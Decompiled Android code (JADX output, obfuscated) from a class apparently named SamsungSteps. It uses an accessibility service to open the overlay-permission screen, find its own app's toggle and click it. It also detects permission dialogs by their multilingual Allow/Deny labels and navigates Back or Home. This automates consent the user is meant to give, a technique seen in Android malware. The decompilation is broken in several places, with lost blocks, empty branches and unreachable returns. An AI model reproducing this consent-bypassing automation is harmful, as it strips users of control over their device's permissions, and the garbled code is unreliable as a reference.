        int i2 = samsungSteps$executeOverlayPermission$1.f54710a3;
        SamsungSteps$FlowType samsungSteps$FlowType = SamsungSteps$FlowType.f54675a3;
        try {
        } catch (Exception e) {
            e = e;
        }
        if (i2 == 0) {
            kg1.m213544f4(obj);
            Context context = this.f55134a1;
            if (Settings.canDrawOverlays(context)) {
                t60.m214714d6(this.f55135a2, "[悬浮窗] 已有悬浮窗权限");
                this.f55136a3.m214996b1(samsungSteps$FlowType);
                return Boolean.TRUE;
            }
            try {
                Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                intent.setData(Uri.parse("package:" + context.getPackageName()));
                intent.setFlags(1350598656);
                context.startActivity(intent);
                samsungSteps$executeOverlayPermission$1.f54707a0 = this;
                samsungSteps$executeOverlayPermission$1.f54710a3 = 1;
                if (b81.m210571b1(2000L, samsungSteps$executeOverlayPermission$1) != coroutineSingletons) {
                    c0370a7 = this;
                }
                return coroutineSingletons;
            } catch (Exception e2) {
                e = e2;
                r0 = this;
                tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), r0.f55135a2);
                return Boolean.FALSE;
            }
        }
        if (i2 != 1) {
            if (i2 != 2) {
                if (i2 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                C0370a7 c0370a73 = samsungSteps$executeOverlayPermission$1.f54707a0;
                kg1.m213544f4(obj);
                r0 = c0370a73;
                return Boolean.TRUE;
            }
            C0370a7 c0370a74 = samsungSteps$executeOverlayPermission$1.f54707a0;
            kg1.m213544f4(obj);
            c0370a72 = c0370a74;
            if (Settings.canDrawOverlays(c0370a72.f55134a1)) {
                c0370a72.f55136a3.m214996b1(samsungSteps$FlowType);
                samsungSteps$executeOverlayPermission$1.f54707a0 = c0370a72;
                samsungSteps$executeOverlayPermission$1.f54710a3 = 3;
                Object objM212369b4 = c0370a72.m212369b4(samsungSteps$executeOverlayPermission$1);
                r0 = c0370a72;
            }
            return Boolean.FALSE;
        }
        C0370a7 c0370a75 = samsungSteps$executeOverlayPermission$1.f54707a0;
        kg1.m213544f4(obj);
        c0370a7 = c0370a75;
        boolean zM212367b0 = c0370a7.m212367b0();
        c0370a72 = c0370a7;
        if (zM212367b0) {
            samsungSteps$executeOverlayPermission$1.f54707a0 = c0370a7;
            samsungSteps$executeOverlayPermission$1.f54710a3 = 2;
            c0370a72 = c0370a7;
            if (b81.m210571b1(1000L, samsungSteps$executeOverlayPermission$1) == coroutineSingletons) {
            }
            return coroutineSingletons;
        }
        if (Settings.canDrawOverlays(c0370a72.f55134a1)) {
        }
        return Boolean.FALSE;
    }

    /* JADX WARN: Code restructure failed: missing block: B:34:0x00a9, code lost:
    
        if (m212356a3((android.view.accessibility.AccessibilityNodeInfo) r2.get(0)) != false) goto L35;
     */
    /* JADX WARN: Removed duplicated region for block: B:33:0x009f  */
    /* JADX WARN: Removed duplicated region for block: B:36:0x00ac  */
    /* renamed from: b0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final boolean m212367b0() throws PackageManager.NameNotFoundException {
        String string;
        ArrayList arrayList;
        AccessibilityNodeInfo rootInActiveWindow = this.f55133a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        Context context = this.f55134a1;
        try {
            PackageManager packageManager = context.getPackageManager();
            ApplicationInfo applicationInfo = packageManager.getApplicationInfo(context.getPackageName(), 0);
            t60.m214694b5(applicationInfo, "pm.getApplicationInfo(context.packageName, 0)");
            string = packageManager.getApplicationLabel(applicationInfo).toString();
        } catch (Exception unused) {
            string = context.getString(R$string.app_name);
            t60.m214694b5(string, "{\n            context.ge…e) // 从资源获取默认名称\n        }");
        }
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(string);
        if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
            String str = this.f55135a2;
            t60.m214726f4(str, "[三星] 未找到应用名称'" + string + "'，尝试备用方案...");
            arrayList = new ArrayList();
            m212357b1(rootInActiveWindow, arrayList);
            if (arrayList.size() == 1) {
                if (arrayList.size() > 1) {
                    t60.m214726f4(str, "[三星] 有" + arrayList.size() + "个开关，无法确定哪个是我们的应用，跳过");
                }
            }
            t60.m214726f4(str, "[三星] 开关点击失败");
            return false;
        }
        loop0: for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText) {
            if (accessibilityNodeInfo.isVisibleToUser()) {
                AccessibilityNodeInfo parent = accessibilityNodeInfo.getParent();
                for (int i = 0; parent != null && i < 5; i++) {
                    AccessibilityNodeInfo accessibilityNodeInfoM212358b2 = m212358b2(parent);
                    if (accessibilityNodeInfoM212358b2 != null && !accessibilityNodeInfoM212358b2.isChecked() && m212356a3(accessibilityNodeInfoM212358b2)) {
                        break loop0;
                    }
                    parent = parent.getParent();
                }
            }
        }
        String str2 = this.f55135a2;
        t60.m214726f4(str2, "[三星] 未找到应用名称'" + string + "'，尝试备用方案...");
        arrayList = new ArrayList();
        m212357b1(rootInActiveWindow, arrayList);
        if (arrayList.size() == 1) {
        }
        t60.m214726f4(str2, "[三星] 开关点击失败");
        return false;
        return true;
    }

    /* renamed from: b3 */
    public final boolean m212368b3() {
        String string;
        AccessibilityNodeInfo rootInActiveWindow = this.f55133a0.getRootInActiveWindow();
        if (rootInActiveWindow == null) {
            return false;
        }
        CharSequence packageName = rootInActiveWindow.getPackageName();
        if (packageName == null || (string = packageName.toString()) == null) {
            string = "";
        }
        List listM213306g5 = AbstractC0716jf.m213306g5("com.android.permissioncontroller", "com.samsung.android.permissioncontroller", "com.google.android.permissioncontroller", "com.android.packageinstaller", "com.samsung.android.packageinstaller");
        if (listM213306g5 == null || !listM213306g5.isEmpty()) {
            Iterator it = listM213306g5.iterator();
            while (it.hasNext()) {
                if (AbstractC0779a1.m213652a5(string, (String) it.next(), true)) {
                    return true;
                }
            }
        }
        Iterator it2 = AbstractC0716jf.m213306g5("允许", "拒绝", "仅在使用", "本次", "始终允许", "允許", "拒絕", "僅在使用", "本次", "始終允許", "Allow", "Deny", "While using the app", "Only this time", "Allow always", "許可", "拒否", "허용", "거부", "Autorizar", "Negar", "Autoriser", "Refuser").iterator();
        int i = 0;
        while (it2.hasNext()) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText((String) it2.next());
            if (listFindAccessibilityNodeInfosByText != null && !listFindAccessibilityNodeInfosByText.isEmpty()) {
                t60.m214694b5(listFindAccessibilityNodeInfosByText, "nodes");
                if (!listFindAccessibilityNodeInfosByText.isEmpty()) {
                    Iterator<T> it3 = listFindAccessibilityNodeInfosByText.iterator();
                    while (true) {
                        if (!it3.hasNext()) {
                            break;
                        }
                        if (((AccessibilityNodeInfo) it3.next()).isVisibleToUser()) {
                            i++;
                            break;
                        }
                    }
                }
            }
        }
        return i >= 2;
    }

    /* JADX WARN: Code restructure failed: missing block: B:19:0x0058, code lost:
    
        if (p000.b81.m210571b1(200, r0) == r1) goto L24;
     */
    /* JADX WARN: Code restructure failed: missing block: B:23:0x006d, code lost:
    
        if (p000.b81.m210571b1(500, r0) == r1) goto L24;
     */
    /* JADX WARN: Removed duplicated region for block: B:18:0x0045  */
    /* JADX WARN: Removed duplicated region for block: B:22:0x005d  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:19:0x0058 -> B:21:0x005b). Please report as a decompilation issue!!! */
    /* renamed from: b4 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212369b4(ContinuationImpl continuationImpl) throws Throwable {
        SamsungSteps$returnToHome$1 samsungSteps$returnToHome$1;
        int i;
        C0370a7 c0370a7;
        int i2;
        if (continuationImpl instanceof SamsungSteps$returnToHome$1) {
            samsungSteps$returnToHome$1 = (SamsungSteps$returnToHome$1) continuationImpl;
            int i3 = samsungSteps$returnToHome$1.f54716a5;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                samsungSteps$returnToHome$1.f54716a5 = i3 - Integer.MIN_VALUE;
            } else {
                samsungSteps$returnToHome$1 = new SamsungSteps$returnToHome$1(this, continuationImpl);
            }
        }
        Object obj = samsungSteps$returnToHome$1.f54714a3;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = samsungSteps$returnToHome$1.f54716a5;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            i = 0;
            c0370a7 = this;
            i2 = 3;
            if (i >= i2) {
            }
            return coroutineSingletons;
        }
        if (i4 != 1) {
            if (i4 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            kg1.m213544f4(obj);
            return C1351vv.f60710b1;
        }
        i = samsungSteps$returnToHome$1.f54713a2;
        i2 = samsungSteps$returnToHome$1.f54712a1;
        c0370a7 = samsungSteps$returnToHome$1.f54711a0;
        kg1.m213544f4(obj);
        i++;
        if (i >= i2) {
            c0370a7.f55133a0.performGlobalAction(1);
            samsungSteps$returnToHome$1.f54711a0 = c0370a7;
            samsungSteps$returnToHome$1.f54712a1 = i2;
            samsungSteps$returnToHome$1.f54713a2 = i;
            samsungSteps$returnToHome$1.f54716a5 = 1;
        } else {
            c0370a7.f55133a0.performGlobalAction(2);
            samsungSteps$returnToHome$1.f54711a0 = null;
            samsungSteps$returnToHome$1.f54716a5 = 2;
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* renamed from: b5 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212370b5(long j, ContinuationImpl continuationImpl) throws Throwable {
        SamsungSteps$waitForPageStable$1 samsungSteps$waitForPageStable$1;
        long jCurrentTimeMillis;
        int i;
        C0370a7 c0370a7;
        int i2;
        if (continuationImpl instanceof SamsungSteps$waitForPageStable$1) {
            samsungSteps$waitForPageStable$1 = (SamsungSteps$waitForPageStable$1) continuationImpl;
            int i3 = samsungSteps$waitForPageStable$1.f54724a7;
            if ((i3 & Integer.MIN_VALUE) != 0) {
                samsungSteps$waitForPageStable$1.f54724a7 = i3 - Integer.MIN_VALUE;
            } else {
                samsungSteps$waitForPageStable$1 = new SamsungSteps$waitForPageStable$1(this, continuationImpl);
            }
        }
        Object obj = samsungSteps$waitForPageStable$1.f54722a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i4 = samsungSteps$waitForPageStable$1.f54724a7;
        if (i4 == 0) {
            kg1.m213544f4(obj);
            jCurrentTimeMillis = System.currentTimeMillis();
            i = -1;
            c0370a7 = this;
            i2 = 0;
        } else {
            if (i4 != 1) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            int i5 = samsungSteps$waitForPageStable$1.f54721a4;
            int i6 = samsungSteps$waitForPageStable$1.f54720a3;
            jCurrentTimeMillis = samsungSteps$waitForPageStable$1.f54719a2;
            long j2 = samsungSteps$waitForPageStable$1.f54718a1;
            c0370a7 = samsungSteps$waitForPageStable$1.f54717a0;
            kg1.m213544f4(obj);
            i = i6;
            i2 = i5;
            j = j2;
        }
        while (System.currentTimeMillis() - jCurrentTimeMillis < j) {
            AccessibilityNodeInfo rootInActiveWindow = c0370a7.f55133a0.getRootInActiveWindow();
            if (rootInActiveWindow != null) {
                int childCount = rootInActiveWindow.getChildCount();
                if (childCount != i || childCount <= 0) {
                    i2 = 0;
                    i = childCount;
                } else {
                    i2++;
                    if (i2 >= 2) {
                        return Boolean.TRUE;
                    }
                }
            }
            samsungSteps$waitForPageStable$1.f54717a0 = c0370a7;
            samsungSteps$waitForPageStable$1.f54718a1 = j;
            samsungSteps$waitForPageStable$1.f54719a2 = jCurrentTimeMillis;
            samsungSteps$waitForPageStable$1.f54720a3 = i;
            samsungSteps$waitForPageStable$1.f54721a4 = i2;
            samsungSteps$waitForPageStable$1.f54724a7 = 1;
            if (b81.m210571b1(150L, samsungSteps$waitForPageStable$1) == coroutineSingletons) {
                return coroutineSingletons;
            }
        }
        return Boolean.FALSE;
    }
}
